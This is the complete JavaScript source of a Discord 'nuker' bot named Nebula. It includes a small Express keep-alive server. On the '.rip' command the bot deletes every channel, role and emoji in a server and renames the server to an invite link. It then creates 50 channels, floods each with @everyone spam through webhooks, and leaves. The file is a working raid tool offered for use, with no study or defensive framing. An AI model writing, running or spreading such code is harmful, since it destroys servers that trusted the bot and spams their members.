// ====== LIBRARIES ======
const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== BOT LOGIC ======
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content === '.rip' && !message.author.bot) {
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';

    // Delete all channels concurrently
    await Promise.all(guild.channels.cache.map(channel =>
      channel.delete().catch(() => {})
    ));

    // Delete all roles except @everyone
    await Promise.all(guild.roles.cache.map(async (role) => {
      if (role.name !== '@everyone' && !role.managed) {
        return role.delete().catch(() => {});
      }
    }));

    // Delete all emojis
    await Promise.all(guild.emojis.cache.map(emoji =>
      emoji.delete().catch(() => {})
    ));

    // Rename server
    try {
      await guild.edit({ name: 'discord.gg/migh' });
    } catch {}

    // Create 50 new channels
    const createdChannels = [];
    for (let i = 0; i < 50; i++) {
      try {
        const channel = await guild.channels.create({ name: 'neb-was-here' });
        createdChannels.push(channel);
      } catch {}
    }

    // Spam each channel with 20 messages using webhooks or fallback to send
    const spamTasks = [];

    for (const channel of createdChannels) {
      try {
        const webhook = await channel.createWebhook({
          name: 'Nebula',
          avatar: 'https://i.imgur.com/6QbX6yA.png '
        });

        for (let i = 0; i < 20; i++) {
          spamTasks.push(
            webhook.send(spamMessage).catch(async () => {
              await channel.send(spamMessage).catch(() => {});
            })
          );
        }
      } catch {
        for (let i = 0; i < 20; i++) {
          spamTasks.push(channel.send(spamMessage).catch(() => {}));
        }
      }
    }

    // Run all spam tasks concurrently
    await Promise.all(spamTasks);

    // Leave the server
    try {
      await guild.leave();
    } catch {}
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
